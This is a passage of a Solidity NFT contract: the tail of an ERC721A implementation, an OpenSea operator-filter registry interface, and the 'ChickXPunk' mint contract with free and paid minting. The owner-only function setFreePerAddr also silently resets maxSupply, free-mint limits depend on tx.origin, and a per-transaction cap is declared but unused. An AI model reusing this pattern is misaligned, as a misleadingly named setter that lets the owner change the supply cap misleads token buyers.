1048             // - `startTimestamp` to the timestamp of minting.
1049             // - `burned` to `false`.
1050             // - `nextInitialized` to `quantity == 1`.
1051             _packedOwnerships[startTokenId] = _packOwnershipData(
1052                 to,
1053                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1054             );
1055 
1056             uint256 toMasked;
1057             uint256 end = startTokenId + quantity;
1058 
1059             // Use assembly to loop and emit the `Transfer` event for gas savings.
1060             // The duplicated `log4` removes an extra check and reduces stack juggling.
1061             // The assembly, together with the surrounding Solidity code, have been
1062             // delicately arranged to nudge the compiler into producing optimized opcodes.
1063             assembly {
1064                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1065                 toMasked := and(to, _BITMASK_ADDRESS)
1066                 // Emit the `Transfer` event.
1067                 log4(
1068                     0, // Start of data (0, since no data).
1069                     0, // End of data (0, since no data).
1070                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1071                     0, // `address(0)`.
1072                     toMasked, // `to`.
1073                     startTokenId // `tokenId`.
1074                 )
1075 
1076                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1077                 // that overflows uint256 will make the loop run out of gas.
1078                 // The compiler will optimize the `iszero` away for performance.
1079                 for {
1080                     let tokenId := add(startTokenId, 1)
1081                 } iszero(eq(tokenId, end)) {
1082                     tokenId := add(tokenId, 1)
1083                 } {
1084                     // Emit the `Transfer` event. Similar to above.
1085                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1086                 }
1087             }
1088             if (toMasked == 0) revert MintToZeroAddress();
1089 
1090             _currentIndex = end;
1091         }
1092         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1093     }
1094 
1095     /**
1096      * @dev Mints `quantity` tokens and transfers them to `to`.
1097      *
1098      * This function is intended for efficient minting only during contract creation.
1099      *
1100      * It emits only one {ConsecutiveTransfer} as defined in
1101      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1102      * instead of a sequence of {Transfer} event(s).
1103      *
1104      * Calling this function outside of contract creation WILL make your contract
1105      * non-compliant with the ERC721 standard.
1106      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1107      * {ConsecutiveTransfer} event is only permissible during contract creation.
1108      *
1109      * Requirements:
1110      *
1111      * - `to` cannot be the zero address.
1112      * - `quantity` must be greater than 0.
1113      *
1114      * Emits a {ConsecutiveTransfer} event.
1115      */
1116     function _mintERC2309(address to, uint256 quantity) internal virtual {
1117         uint256 startTokenId = _currentIndex;
1118         if (to == address(0)) revert MintToZeroAddress();
1119         if (quantity == 0) revert MintZeroQuantity();
1120         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1121 
1122         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1123 
1124         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1125         unchecked {
1126             // Updates:
1127             // - `balance += quantity`.
1128             // - `numberMinted += quantity`.
1129             //
1130             // We can directly add to the `balance` and `numberMinted`.
1131             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1132 
1133             // Updates:
1134             // - `address` to the owner.
1135             // - `startTimestamp` to the timestamp of minting.
1136             // - `burned` to `false`.
1137             // - `nextInitialized` to `quantity == 1`.
1138             _packedOwnerships[startTokenId] = _packOwnershipData(
1139                 to,
1140                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1141             );
1142 
1143             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1144 
1145             _currentIndex = startTokenId + quantity;
1146         }
1147         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1148     }
1149 
1150     /**
1151      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1152      *
1153      * Requirements:
1154      *
1155      * - If `to` refers to a smart contract, it must implement
1156      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1157      * - `quantity` must be greater than 0.
1158      *
1159      * See {_mint}.
1160      *
1161      * Emits a {Transfer} event for each mint.
1162      */
1163     function _safeMint(
1164         address to,
1165         uint256 quantity,
1166         bytes memory _data
1167     ) internal virtual {
1168         _mint(to, quantity);
1169 
1170         unchecked {
1171             if (to.code.length != 0) {
1172                 uint256 end = _currentIndex;
1173                 uint256 index = end - quantity;
1174                 do {
1175                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1176                         revert TransferToNonERC721ReceiverImplementer();
1177                     }
1178                 } while (index < end);
1179                 // Reentrancy protection.
1180                 if (_currentIndex != end) revert();
1181             }
1182         }
1183     }
1184 
1185     /**
1186      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1187      */
1188     function _safeMint(address to, uint256 quantity) internal virtual {
1189         _safeMint(to, quantity, '');
1190     }
1191 
1192     // =============================================================
1193     //                        BURN OPERATIONS
1194     // =============================================================
1195 
1196     /**
1197      * @dev Equivalent to `_burn(tokenId, false)`.
1198      */
1199     function _burn(uint256 tokenId) internal virtual {
1200         _burn(tokenId, false);
1201     }
1202 
1203     /**
1204      * @dev Destroys `tokenId`.
1205      * The approval is cleared when the token is burned.
1206      *
1207      * Requirements:
1208      *
1209      * - `tokenId` must exist.
1210      *
1211      * Emits a {Transfer} event.
1212      */
1213     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1214         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1215 
1216         address from = address(uint160(prevOwnershipPacked));
1217 
1218         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1219 
1220         if (approvalCheck) {
1221             // The nested ifs save around 20+ gas over a compound boolean condition.
1222             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1223                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1224         }
1225 
1226         _beforeTokenTransfers(from, address(0), tokenId, 1);
1227 
1228         // Clear approvals from the previous owner.
1229         assembly {
1230             if approvedAddress {
1231                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1232                 sstore(approvedAddressSlot, 0)
1233             }
1234         }
1235 
1236         // Underflow of the sender's balance is impossible because we check for
1237         // ownership above and the recipient's balance can't realistically overflow.
1238         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1239         unchecked {
1240             // Updates:
1241             // - `balance -= 1`.
1242             // - `numberBurned += 1`.
1243             //
1244             // We can directly decrement the balance, and increment the number burned.
1245             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1246             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1247 
1248             // Updates:
1249             // - `address` to the last owner.
1250             // - `startTimestamp` to the timestamp of burning.
1251             // - `burned` to `true`.
1252             // - `nextInitialized` to `true`.
1253             _packedOwnerships[tokenId] = _packOwnershipData(
1254                 from,
1255                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1256             );
1257 
1258             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1259             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1260                 uint256 nextTokenId = tokenId + 1;
1261                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1262                 if (_packedOwnerships[nextTokenId] == 0) {
1263                     // If the next slot is within bounds.
1264                     if (nextTokenId != _currentIndex) {
1265                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1266                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1267                     }
1268                 }
1269             }
1270         }
1271 
1272         emit Transfer(from, address(0), tokenId);
1273         _afterTokenTransfers(from, address(0), tokenId, 1);
1274 
1275         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1276         unchecked {
1277             _burnCounter++;
1278         }
1279     }
1280 
1281     // =============================================================
1282     //                     EXTRA DATA OPERATIONS
1283     // =============================================================
1284 
1285     /**
1286      * @dev Directly sets the extra data for the ownership data `index`.
1287      */
1288     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1289         uint256 packed = _packedOwnerships[index];
1290         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1291         uint256 extraDataCasted;
1292         // Cast `extraData` with assembly to avoid redundant masking.
1293         assembly {
1294             extraDataCasted := extraData
1295         }
1296         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1297         _packedOwnerships[index] = packed;
1298     }
1299 
1300     /**
1301      * @dev Called during each token transfer to set the 24bit `extraData` field.
1302      * Intended to be overridden by the cosumer contract.
1303      *
1304      * `previousExtraData` - the value of `extraData` before transfer.
1305      *
1306      * Calling conditions:
1307      *
1308      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1309      * transferred to `to`.
1310      * - When `from` is zero, `tokenId` will be minted for `to`.
1311      * - When `to` is zero, `tokenId` will be burned by `from`.
1312      * - `from` and `to` are never both zero.
1313      */
1314     function _extraData(
1315         address from,
1316         address to,
1317         uint24 previousExtraData
1318     ) internal view virtual returns (uint24) {}
1319 
1320     /**
1321      * @dev Returns the next extra data for the packed ownership data.
1322      * The returned result is shifted into position.
1323      */
1324     function _nextExtraData(
1325         address from,
1326         address to,
1327         uint256 prevOwnershipPacked
1328     ) private view returns (uint256) {
1329         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1330         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1331     }
1332 
1333     // =============================================================
1334     //                       OTHER OPERATIONS
1335     // =============================================================
1336 
1337     /**
1338      * @dev Returns the message sender (defaults to `msg.sender`).
1339      *
1340      * If you are writing GSN compatible contracts, you need to override this function.
1341      */
1342     function _msgSenderERC721A() internal view virtual returns (address) {
1343         return msg.sender;
1344     }
1345 
1346     /**
1347      * @dev Converts a uint256 to its ASCII string decimal representation.
1348      */
1349     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1350         assembly {
1351             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1352             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1353             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1354             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1355             let m := add(mload(0x40), 0xa0)
1356             // Update the free memory pointer to allocate.
1357             mstore(0x40, m)
1358             // Assign the `str` to the end.
1359             str := sub(m, 0x20)
1360             // Zeroize the slot after the string.
1361             mstore(str, 0)
1362 
1363             // Cache the end of the memory to calculate the length later.
1364             let end := str
1365 
1366             // We write the string from rightmost digit to leftmost digit.
1367             // The following is essentially a do-while loop that also handles the zero case.
1368             // prettier-ignore
1369             for { let temp := value } 1 {} {
1370                 str := sub(str, 1)
1371                 // Write the character to the pointer.
1372                 // The ASCII index of the '0' character is 48.
1373                 mstore8(str, add(48, mod(temp, 10)))
1374                 // Keep dividing `temp` until zero.
1375                 temp := div(temp, 10)
1376                 // prettier-ignore
1377                 if iszero(temp) { break }
1378             }
1379 
1380             let length := sub(end, str)
1381             // Move the pointer 32 bytes leftwards to make room for the length.
1382             str := sub(str, 0x20)
1383             // Store the length.
1384             mstore(str, length)
1385         }
1386     }
1387 }
1388 
1389 
1390 interface IOperatorFilterRegistry {
1391     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1392     function register(address registrant) external;
1393     function registerAndSubscribe(address registrant, address subscription) external;
1394     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1395     function unregister(address addr) external;
1396     function updateOperator(address registrant, address operator, bool filtered) external;
1397     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1398     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1399     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1400     function subscribe(address registrant, address registrantToSubscribe) external;
1401     function unsubscribe(address registrant, bool copyExistingEntries) external;
1402     function subscriptionOf(address addr) external returns (address registrant);
1403     function subscribers(address registrant) external returns (address[] memory);
1404     function subscriberAt(address registrant, uint256 index) external returns (address);
1405     function copyEntriesOf(address registrant, address registrantToCopy) external;
1406     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1407     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1408     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1409     function filteredOperators(address addr) external returns (address[] memory);
1410     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1411     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1412     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1413     function isRegistered(address addr) external returns (bool);
1414     function codeHashOf(address addr) external returns (bytes32);
1415 }
1416 
1417 
1418 /**
1419  * @title  OperatorFilterer
1420  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1421  *         registrant's entries in the OperatorFilterRegistry.
1422  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1423  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1424  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1425  */
1426 abstract contract OperatorFilterer {
1427     error OperatorNotAllowed(address operator);
1428 
1429     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1430         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1431 
1432     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1433         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1434         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1435         // order for the modifier to filter addresses.
1436         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1437             if (subscribe) {
1438                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1439             } else {
1440                 if (subscriptionOrRegistrantToCopy != address(0)) {
1441                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1442                 } else {
1443                     OPERATOR_FILTER_REGISTRY.register(address(this));
1444                 }
1445             }
1446         }
1447     }
1448 
1449     modifier onlyAllowedOperator(address from) virtual {
1450         // Check registry code length to facilitate testing in environments without a deployed registry.
1451         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1452             // Allow spending tokens from addresses with balance
1453             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1454             // from an EOA.
1455             if (from == msg.sender) {
1456                 _;
1457                 return;
1458             }
1459             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1460                 revert OperatorNotAllowed(msg.sender);
1461             }
1462         }
1463         _;
1464     }
1465 
1466     modifier onlyAllowedOperatorApproval(address operator) virtual {
1467         // Check registry code length to facilitate testing in environments without a deployed registry.
1468         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1469             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1470                 revert OperatorNotAllowed(operator);
1471             }
1472         }
1473         _;
1474     }
1475 }
1476 
1477 /**
1478  * @title  DefaultOperatorFilterer
1479  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1480  */
1481 abstract contract TheOperatorFilterer is OperatorFilterer {
1482     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1483 
1484     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1485 }
1486 
1487 
1488 contract ChickXPunk is ERC721A, TheOperatorFilterer {
1489 
1490     address public owner;
1491 
1492     uint256 public maxSupply = 777;
1493 
1494     uint256 public PRICE = 0.002 ether;
1495 
1496     uint256 public FreeNumTx = 1;
1497 
1498     uint256 private MaxPerTx;
1499 
1500     mapping(address => uint256) private _userForFree;
1501 
1502     mapping(uint256 => uint256) private _userMinted;
1503 
1504     function mint(uint256 amount) payable public {
1505         require(totalSupply() + amount <= maxSupply);
1506         mintInternal(amount);
1507     }
1508 
1509     function mintInternal(uint256 amount) internal {
1510         if (msg.value == 0) {
1511             require(amount == 1);
1512             if (totalSupply() > maxSupply / 3) {
1513                 require(_userMinted[block.number] < FreeNum() 
1514                         && _userForFree[tx.origin] < FreeNumTx);
1515                 _userForFree[tx.origin]++;
1516                 _userMinted[block.number]++;
1517             }
1518             _safeMint(msg.sender, 1);
1519         } else {
1520             require(msg.value >= PRICE * amount);
1521             _safeMint(msg.sender, amount);
1522         }
1523     }
1524 
1525     function teamMint(address addr, uint256 amount) public onlyOwner {
1526         require(totalSupply() + amount <= maxSupply);
1527         _safeMint(addr, amount);
1528     }
1529     
1530     modifier onlyOwner {
1531         require(owner == msg.sender);
1532         _;
1533     }
1534 
1535     constructor() ERC721A("ChickX Punk", "Punk") {
1536         owner = msg.sender;
1537         MaxPerTx = 10;
1538     }
1539 
1540     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1541         return string(abi.encodePacked("ipfs://QmW2FyYt1znCMpRoggHRcbcBP52rjm6SEni59v4sgSKd7V/", _toString(tokenId), ".json"));
1542     }
1543 
1544     function setFreePerAddr(uint256 maxTx, uint256 maxS) external onlyOwner {
1545         FreeNumTx = maxTx;
1546         maxSupply = maxS;
1547     }
1548 
1549     function FreeNum() internal returns (uint256){
1550         return (maxSupply - totalSupply()) / 12;
1551     }
1552 
1553     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1554         uint256 royaltyAmount = (_salePrice * 69) / 1000;
1555         return (owner, royaltyAmount);
1556     }
1557 
1558     function withdraw() external onlyOwner {
1559         payable(msg.sender).transfer(address(this).balance);
1560     }
1561 
1562     /////////////////////////////
1563     // OPENSEA FILTER REGISTRY 
1564     /////////////////////////////
1565 
1566     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1567         super.setApprovalForAll(operator, approved);
1568     }
1569 
1570     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1571         super.approve(operator, tokenId);
1572     }
1573 
1574     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1575         super.transferFrom(from, to, tokenId);
1576     }
1577 
1578     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1579         super.safeTransferFrom(from, to, tokenId);
1580     }
1581 
1582     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1583         public
1584         payable
1585         override
1586         onlyAllowedOperator(from)
1587     {
1588         super.safeTransferFrom(from, to, tokenId, data);
1589     }
1590 }